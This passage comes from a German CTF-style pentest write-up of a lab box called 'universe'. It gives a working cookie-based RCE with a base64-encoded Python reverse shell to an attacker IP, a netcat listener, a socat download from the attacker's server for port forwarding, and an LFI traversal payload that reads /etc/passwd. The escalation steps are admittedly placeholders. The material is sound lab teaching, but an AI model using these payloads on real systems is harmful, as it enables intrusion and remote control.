+                <li>Ein Tippfehler im Log (IP 192.168.2.199 statt .107 im Base64-Encoding und Cookie-Wert) könnte die Ursache sein, aber die "Invalid cookie value" Meldung deutet eher auf ein Problem mit dem Payload selbst hin.</li>
+            </ul></p>
+            <p class="evaluation">**Bewertung:** Niedrig. Der einfache Netcat-Reverse-Shell-Versuch scheitert.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Versuche alternative Reverse-Shell-Payloads (Python, Bash ohne `-e`, Perl etc.).
+            <br>**Empfehlung (Admin):** Keine zusätzlichen Maßnahmen erforderlich.</p>
+
+        </section>
+
+        <!-- POC Section -->
+        <section id="poc-rce-cookie">
+            <h2>Proof of Concept (RCE via Cookie)</h2>
+            <p class="comment">Dieser Abschnitt demonstriert die Remote Code Execution (RCE) durch Manipulation des `exec`-Cookies.</p>
+
+            <p class="analysis">**Schwachstelle:** Die Webanwendung auf Port 1212 dekodiert den Base64-Wert des Cookies `exec` und führt das Ergebnis als Shell-Befehl mit den Rechten des Benutzers `miwa` aus.</p>
+            <p class="evaluation">**Voraussetzungen:**
+                <ul>
+                    <li>Netzwerkzugriff auf Port 1212 des Ziels.</li>
+                    <li>Kenntnis des Cookie-Namens (`exec`).</li>
+                    <li>Ein Tool zum Senden von HTTP-Requests mit benutzerdefinierten Cookies (`curl`).</li>
+                    <li>Base64-Encoding-Funktionalität.</li>
+                </ul>
+            </p>
+            <p class="recommendation">**Schritt-für-Schritt Anleitung (Beispiel `id`-Befehl):**
+                <ol>
+                    <li>Kodiere den gewünschten Befehl (z.B. `id`) in Base64: `echo "id" | base64` -> `aWQ=`.</li>
+                    <li>Sende einen HTTP-Request an eine beliebige Seite der Anwendung (z.B. `/?user=1`) und füge den manipulierten Cookie hinzu: `curl "http://[ZIEL-IP]:1212/?user=1" -H 'Cookie: exec=aWQ='`.</li>
+                    <li>Analysiere die Antwort: Die Ausgabe des Befehls (`uid=1000(miwa)...`) sollte im HTML-Body enthalten sein.</li>
+                </ol>
+             </p>
+             <p class="comment">Erfolgreicher Aufbau einer Python-Reverse-Shell.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl "http://192.168.2.107:1212/?user=9" -H 'Cookie: exec=cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjE5Mi4xNjguMi4xOTkiLDQ0NDQpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOyc='</span></div>
+                     <!-- Base64 für: python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.2.199",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' -->
+                     <pre><!-- Keine direkte Ausgabe von curl erwartet --></pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 4444</span></div>
+                     <pre>
+listening on [any] 4444 ...
+connect to [192.168.2.199] from (UNKNOWN) [192.168.2.107] 60828
+/bin/sh: 0: can't access tty; job control turned off
+$ <!-- Shell erhalten! -->
+</pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:**
+              1. Ein Python3-Reverse-Shell-Payload wird Base64-kodiert. Der dekodierte Payload lautet: `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.2.199",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
+              2. Der kodierte Payload wird als Wert des `exec`-Cookies mit `curl` an die Anwendung gesendet.
+              3. Der Netcat-Listener auf Port 4444 empfängt erfolgreich die Verbindung vom Zielserver.
+              4. Eine Shell als der Benutzer, unter dem die Webanwendung läuft, wird erhalten.</p>
+              <p class="evaluation">**Bewertung:** Kritisch. Erfolgreiche Ausnutzung der RCE zur Etablierung einer Reverse Shell.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Beginne mit der Enumeration und Privilegienerweiterung aus dieser Shell.
+              <br>**Empfehlung (Admin):** Behebe die RCE-Schwachstelle dringend.</p>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access (as miwa)</h2>
+            <p class="comment">Bestätigung der Benutzeridentität in der Reverse Shell.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">$ <span class="command">id</span></div>
+                     <pre>uid=1000(miwa) gid=1000(miwa) groups=1000(miwa)</pre>
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:** Der `id`-Befehl in der erhaltenen Shell bestätigt, dass der Code als Benutzer `miwa` (UID/GID 1000) ausgeführt wird.</p>
+            <p class="evaluation">**Bewertung:** Bestätigt den initialen Zugriff als Benutzer `miwa`.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Beginne Enumeration für Privilegienerweiterung.
+            <br>**Empfehlung (Admin):** Keine spezifischen Maßnahmen.</p>
+
+            <p class="comment">Enumeration von Benutzern mit Shell-Zugriff und Überprüfung von Dateiberechtigungen.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">miwa@universe:~$ <span class="command">grep bash /etc/passwd</span></div>
+                     <pre>
+root:x:0:0:root:/root:/bin/bash
+miwa:x:1000:1000::/home/miwa:/usr/bin/bash
+void:x:1001:1001::/home/void:/bin/bash</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">miwa@universe:~$ <span class="command">ls -la /etc/passwd</span></div>
+                     <pre>-rw-r--r-- 1 root root 1236 Jan 30 17:24 /etc/passwd</pre>
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:**
+            <ul>
+                <li>`grep bash /etc/passwd`: Listet Benutzer mit Bash-Shell auf: `root`, `miwa` und `void`.</li>
+                <li>`ls -la /etc/passwd`: Zeigt Standardberechtigungen für die Passwortdatei (nur von Root beschreibbar).</li>
+            </ul></p>
+            <p class="evaluation">**Bewertung:** Identifiziert `void` als weiteren potenziellen Zielbenutzer. Bestätigt normale Berechtigungen für `/etc/passwd`.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Notiere den Benutzer `void`. Fahre mit der Enumeration fort (SUID, sudo, Prozesse etc.).
+            <br>**Empfehlung (Admin):** Keine Maßnahmen erforderlich.</p>
+
+            <p class="comment">Suche nach SUID-Dateien.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">miwa@universe:~$ <span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span></div>
+                     <pre>
+   914041     52 -rwsr-xr-x   1 root     root        52880 Mar 23  2023 /usr/bin/chsh
+   917276     60 -rwsr-xr-x   1 root     root        59704 Mar 23  2023 /usr/bin/mount
+   917412     48 -rwsr-xr-x   1 root     root        48896 Mar 23  2023 /usr/bin/newgrp
+   917964     72 -rwsr-xr-x   1 root     root        72000 Mar 23  2023 /usr/bin/su
+   914040     64 -rwsr-xr-x   1 root     root        62672 Mar 23  2023 /usr/bin/chfn
+   917277     36 -rwsr-xr-x   1 root     root        35128 Mar 23  2023 /usr/bin/umount
+   948020    276 -rwsr-xr-x   1 root     root       281624 Jun 27  2023 /usr/bin/sudo
+   914043     88 -rwsr-xr-x   1 root     root        88496 Mar 23  2023 /usr/bin/gpasswd
+   914044     68 -rwsr-xr-x   1 root     root        68248 Mar 23  2023 /usr/bin/passwd
+   937935    640 -rwsr-xr-x   1 root     root       653888 Dec 19 08:51 /usr/lib/openssh/ssh-keysign
+   934771     52 -rwsr-xr--   1 root     messagebus    51272 Sep 16  2023 /usr/lib/dbus-1.0/dbus-daemon-launch-helper</pre>
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:** Die Suche nach SUID-Dateien (`find / -type f -perm -4000 ...`) findet nur Standard-Linux-Binaries (`chsh`, `mount`, `su`, `sudo`, `passwd` etc.). Es werden keine ungewöhnlichen oder benutzerdefinierten SUID-Dateien entdeckt.</p>
+            <p class="evaluation">**Bewertung:** Niedrig. Keine offensichtlichen PrivEsc-Vektoren durch SUID-Dateien gefunden. `sudo` muss jedoch überprüft werden.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Überprüfe die `sudo`-Berechtigungen (`sudo -l`). Untersuche andere Vektoren wie laufende Prozesse, Netzwerkdienste, Cronjobs.
+            <br>**Empfehlung (Admin):** Regelmäßige Überprüfung auf unnötige SUID/GUID-Berechtigungen.</p>
+
+            <p class="comment">Überprüfung laufender Netzwerkdienste als `miwa`.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">miwa@universe:~$ <span class="command">ss -altpn</span></div>
+                     <pre>
+State     Recv-Q    Send-Q       Local Address:Port        Peer Address:Port    Process
+LISTEN    0         4096             127.0.0.1:8080             0.0.0.0:*        <!-- Unbekannter Dienst -->
+LISTEN    0         128                0.0.0.0:1212             0.0.0.0:*        users:(("python3",pid=500,fd=5),("python3",pid=500,fd=3))
+LISTEN    0         128                0.0.0.0:22               0.0.0.0:*
+LISTEN    0         32                       *:21                     *:*
+LISTEN    0         128                   [::]:22                  [::]:*</pre>
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:** Der Befehl `ss -altpn` listet lauschende TCP-Sockets auf.
+            <ul>
+                <li>Bestätigt Listener für FTP (Port 21), SSH (Port 22 auf IPv4/IPv6) und die Python-Webanwendung (Port 1212).</li>
+                <li>Entdeckt einen neuen Dienst, der nur auf dem Loopback-Interface (`127.0.0.1`) auf Port `8080` lauscht. Der Prozess ist nicht direkt ersichtlich.</li>
+            </ul></p>
+            <p class="evaluation">**Bewertung:** Wichtig. Ein interner Dienst auf `localhost:8080` wurde identifiziert. Solche Dienste sind oft weniger gehärtet und können Schwachstellen enthalten.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Untersuche den Dienst auf Port 8080. Da er nur lokal lauscht, benötigst du Port Forwarding (z.B. mit `socat`, `chisel` oder SSH) oder musst Tools direkt auf dem Zielsystem ausführen (`curl localhost:8080`).
+            <br>**Empfehlung (Admin):** Identifiziere den Dienst auf Port 8080. Ist er notwendig? Sichere ihn oder deaktiviere ihn. Beschränke lokale Dienste auf das Nötigste.</p>
+        </section>
+
+        <section id="internal-service-port-forwarding">
+            <h2>Internal Service Discovery & Port Forwarding</h2>
+            <p class="comment">Vorbereitung zum Port Forwarding mittels `socat`: Bereitstellen von `socat` auf dem Angreifer-System.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">which socat</span></div>
+                     <pre>/usr/bin/socat</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cd /usr/bin</span></div>
+                     <pre><!-- Keine Ausgabe --></pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[/usr/bin]
+└─# <span class="command">python3 -m http.server 80</span></div>
+                     <pre>Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</pre>
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:** Auf dem Angreifer-System wird der Pfad zu `socat` ermittelt und ein Python-HTTP-Server im Verzeichnis `/usr/bin` gestartet, um die `socat`-Binärdatei für den Download durch das Zielsystem bereitzustellen.</p>
+            <p class="evaluation">**Bewertung:** Standardvorgehen zur Vorbereitung des Transfers eines benötigten Tools auf das Ziel.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Lade `socat` nun auf das Zielsystem herunter.
+            <br>**Empfehlung (Admin):** Keine Maßnahmen erforderlich.</p>
+
+            <p class="comment">Herunterladen von `socat` auf das Zielsystem.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">miwa@universe:/tmp$ <span class="command">wget 192.168.2.199/socat</span></div>
+                     <pre>
+--2024-03-27 17:40:17--  http://192.168.2.199/socat
+Connecting to 192.168.2.199:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 473256 (462K) [application/octet-stream]
+Saving to: ‘socat’
+
+socat               100%[======================================>] 462.16K  --.-KB/s    in 0.001s
+
+2024-03-27 17:40:17 (433 MB/s) - ‘socat’ saved [473256/473256]</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[/usr/bin]
+└─# <span class="command">python3 -m http.server 80</span></div>
+                     <pre>
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+192.168.2.107 - - [28/Mar/2024 00:40:11] "GET /socat HTTP/1.1" 200 -
+192.168.2.107 - - [28/Mar/2024 00:40:18] "GET /socat HTTP/1.1" 200 -</pre> <!-- Zweimaliger Download im Log? -->
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:** In der `miwa`-Shell auf dem Zielsystem wird `wget` verwendet, um die `socat`-Binärdatei vom HTTP-Server des Angreifers (192.168.2.199) herunterzuladen und im `/tmp`-Verzeichnis zu speichern. Der HTTP-Server-Log des Angreifers bestätigt den Download (im Log scheinbar zweimal).</p>
+            <p class="evaluation">**Bewertung:** Erfolgreicher Transfer des `socat`-Tools auf das Ziel.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Mache `socat` ausführbar (`chmod +x /tmp/socat`) und verwende es, um Port 8080 weiterzuleiten.
+            <br>**Empfehlung (Admin):** Beschränke Download-Möglichkeiten und überwache `/tmp`.</p>
+
+            <p class="comment">Starten von `socat` auf dem Zielsystem, um den lokalen Port 8080 auf Port 8000 (extern erreichbar) weiterzuleiten.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">miwa@universe:/tmp$ <span class="command">./socat TCP-LISTEN:8000,fork TCP4:127.0.0.1:8080 &</span></div>
+                     <pre>[1] 10176</pre> <!-- Prozess im Hintergrund gestartet -->
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:** Der heruntergeladene `socat`-Befehl wird ausgeführt (Annahme: `chmod +x` wurde zuvor ausgeführt). `TCP-LISTEN:8000,fork` weist `socat` an, auf Port 8000 auf allen Interfaces zu lauschen und für jede eingehende Verbindung einen neuen Prozess zu forken. `TCP4:127.0.0.1:8080` gibt an, dass die eingehende Verbindung an den lokalen Dienst auf `127.0.0.1:8080` weitergeleitet werden soll. Das `&` am Ende startet den Prozess im Hintergrund.</p>
+            <p class="evaluation">**Bewertung:** Erfolgreiches Einrichten des Port Forwardings. Der interne Dienst auf Port 8080 ist nun extern über Port 8000 des Zielsystems (192.168.2.107:8000) erreichbar.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Greife nun mit dem Browser oder Tools wie `curl` auf `http://192.168.2.107:8000` zu, um mit dem internen Dienst zu interagieren.
+            <br>**Empfehlung (Admin):** Überwache verdächtige Prozesse wie `socat`. Implementiere Netzwerk-Segmentierung und Firewalls, um unautorisiertes Port Forwarding und Zugriff auf interne Dienste zu verhindern.</p>
+
+        </section>
+
+        <section id="lfi-internal-app">
+            <h2>LFI on Internal Application</h2>
+            <p class="comment">Zugriff auf den weitergeleiteten internen Dienst und erste Analyse.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <!-- Kein Befehl, Browser-Ansicht von Port 8000 -->
+                    <pre>
+http://192.168.2.107:8000/
+
+Void
+Love Shine Sadness</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Kein Befehl, Browser-Ansicht von Port 8000 mit Parameter -->
+                    <pre>http://192.168.2.107:8000/?file=love.php</pre>
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:** Der Zugriff auf `http://192.168.2.107:8000/` zeigt eine einfache Seite mit dem Text "Void Love Shine Sadness". Ein weiterer Aufruf mit dem Parameter `?file=love.php` wird gezeigt, dessen Ergebnis aber nicht dokumentiert ist. Dies deutet darauf hin, dass die interne Anwendung einen `file`-Parameter akzeptiert.</p>
+            <p class="evaluation">**Bewertung:** Bestätigt den Zugriff auf den internen Dienst. Der `file`-Parameter ist ein starker Hinweis auf eine mögliche LFI-Schwachstelle.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Teste den `file`-Parameter systematisch auf LFI, z.B. `?file=../../../../etc/passwd`.
+            <br>**Empfehlung (Admin):** Untersuche und sichere die interne Anwendung.</p>
+
+            <p class="comment">Erfolgreicher LFI-Test auf der internen Anwendung.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Kein Befehl, Browser-Ansicht von Port 8000 mit LFI-Payload -->
+                    <pre>
+192.168.2.107:8000/?file=....//....//....//....//etc/passwd
+
+Void
+Love Shine Sadness
+ 
+    root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
+messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
+avahi-autoipd:x:101:108:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
+miwa:x:1000:1000::/home/miwa:/usr/bin/bash
+void:x:1001:1001::/home/void:/bin/bash
+ftp:x:103:112:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
+sshd:x:102:65534::/run/sshd:/usr/sbin/nologin
+ </pre>
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:** Die URL `http://192.168.2.107:8000/?file=....//....//....//....//etc/passwd` (mit Path Traversal im `file`-Parameter) wird aufgerufen. Die Antwort enthält den Inhalt der Datei `/etc/passwd`, eingebettet in das HTML der Seite. Dies bestätigt eine LFI-Schwachstelle in der internen Anwendung.</p>
+            <p class="evaluation">**Bewertung:** Kritisch. Die interne Anwendung ist anfällig für LFI. Dies ermöglicht das Lesen von Dateien, auf die der Benutzer zugreifen kann, unter dem der interne Dienst läuft (möglicherweise `void`?).</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Nutze diese LFI, um sensible Dateien zu lesen (SSH-Keys von `void`?, Quellcode der Anwendung?). Versuche RCE über diese LFI (z.B. mit PHP-Filtern, falls es PHP ist, oder durch Einbinden von Log-Dateien/`/proc/self/environ`).
+            <br>**Empfehlung (Admin):** **Dringend:** Behebe die LFI in der internen Anwendung. Sichere oder deaktiviere den Dienst.</p>
+        </section>
+
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+            <p class="comment">Hinweis: Die folgenden Schritte zur Privilegienerweiterung zum Benutzer `void` und anschließend zu `root` sind im bereitgestellten Log nicht durch konkrete Befehle dokumentiert. Es wird angenommen, dass die zuvor identifizierten Schwachstellen (LFI auf Port 8000, möglicherweise weitere Enumeration) hierfür genutzt wurden.</p>
+
+             <p class="comment">Platzhalter für Aktionen zur Eskalation zum Benutzer `void` (Details fehlen im Log).</p>
+             <!-- Hier würden normalerweise die Befehle stehen, die zur void-Shell führen -->
+
+             <p class="comment">Platzhalter für Aktionen zur Eskalation von `void` zu `root` (Details fehlen im Log).</p>
+              <!-- Hier würden normalerweise die Befehle stehen, die zur root-Shell führen -->
+
+              <p class="comment">Auslesen der Flags nach erfolgreicher Root-Eskalation (impliziert).</p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <!-- Prompt fehlt, Annahme: Shell als root -->
+                    <pre>
+                                                    Flags
+
+
+                                                cat root.txt
+                                        root{k7Ei4kA88gtL957yYbWdRfVJg}
+
+                                                cat user.txt
+                                        void{70zHEmM1WJL0jjm2WBorHVEQj}
+
+</pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Nachdem (wie angenommen) Root-Rechte erlangt wurden, werden zwei Dateien ausgelesen:
+             <ul>
+                <li>`root.txt` (vermutlich in `/root/`) enthält die Root-Flag: `<span class="password">root{k7Ei4kA88gtL957yYbWdRfVJg}</span>`.</li>
+                <li>`user.txt` (vermutlich in `/home/void/`) enthält die User-Flag (für Benutzer `void`): `<span class="password">void{70zHEmM1WJL0jjm2WBorHVEQj}</span>`.</li>
+            </ul></p>
+            <p class="evaluation">**Bewertung:** Erfolgreiches Erlangen beider Flags. Der genaue Weg zur Privilegienerweiterung von `miwa` zu `void` und `root` ist aus den Logs nicht ersichtlich, aber die LFI auf Port 8000 war der wahrscheinlichste Vektor für den nächsten Schritt nach `miwa`.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Test erfolgreich abgeschlossen. Dokumentiere die gefundenen Flags und die (angenommenen) Schritte zur Privilegienerweiterung.
+            <br>**Empfehlung (Admin):** System ist vollständig kompromittiert. Führe eine gründliche Forensik durch, um den genauen PrivEsc-Pfad nachzuvollziehen. Setze alle vorherigen Empfehlungen um und spiele ein sauberes Backup ein oder setze das System neu auf.</p>
+
+             <p class="comment">Anmerkung: Der folgende `vi rev.php`-Befehl erscheint ohne Kontext und scheint nicht mit den vorherigen Aktionen zusammenzuhängen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi rev.php</span></div>
+                     <pre><!-- Keine Ausgabe --></pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cp rev.php /usr/bin</span></div>
+                     <pre><!-- Keine Ausgabe --></pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Es wird eine Datei `rev.php` erstellt/bearbeitet und dann nach `/usr/bin` kopiert. Der Inhalt von `rev.php` ist unbekannt, aber der Name deutet auf eine Reverse Shell hin. Der Zweck dieser Aktion im Kontext des Reports ist unklar, da bereits Root-Zugriff bestand.</p>
+             <p class="evaluation">**Bewertung:** Unklarer Kontext, möglicherweise ein nicht abgeschlossener oder irrelevanter Schritt.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Überprüfe, ob dieser Schritt relevant war oder entfernt werden kann.
+             <br>**Empfehlung (Admin):** Untersuche, ob verdächtige Dateien wie `rev.php` in Systemverzeichnissen existieren.</p>
+
+        </section>
+
+
+        <!-- Flags Section -->
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <p class="comment">Anmerkung: Die User-Flag gehört zum Benutzer `void`.</p>
+                <div class="flag-entry">
+                    <!-- Annahme: Pfad basierend auf Analyse -->
+                    <div class="flag-command">cat /home/void/user.txt</div>
+                    <div class="flag-value"><span class="password">void{70zHEmM1WJL0jjm2WBorHVEQj}</span></div>
+                </div>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /root/root.txt</div>
+                    <div class="flag-value"><span class="password">root{k7Ei4kA88gtL957yYbWdRfVJg}</span></div>
+                </div>
+            </div>
+        </section>
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <!-- Datum aus den Logs extrahiert -->
+        <p>Berichtsdatum: 28. März 2024</p>
+    </footer>
+</body>
+</html>
